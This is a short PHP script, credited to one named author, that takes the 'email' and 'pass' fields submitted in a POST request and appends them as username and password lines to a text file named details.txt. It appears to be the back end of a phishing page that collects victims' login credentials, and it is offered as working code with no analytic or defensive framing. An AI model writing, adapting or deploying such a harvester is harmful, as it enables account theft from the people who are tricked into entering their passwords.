// Author:- Hamza Aziz
<?php
$file="details.txt";
$x=$_POST['email'];
$y=$_POST['pass'];

$data ="Username : ".$x."\n Password : ".$y;

$f =fopen($file,'a');
fwrite($f, $data."\n");
fclose($f);
?>
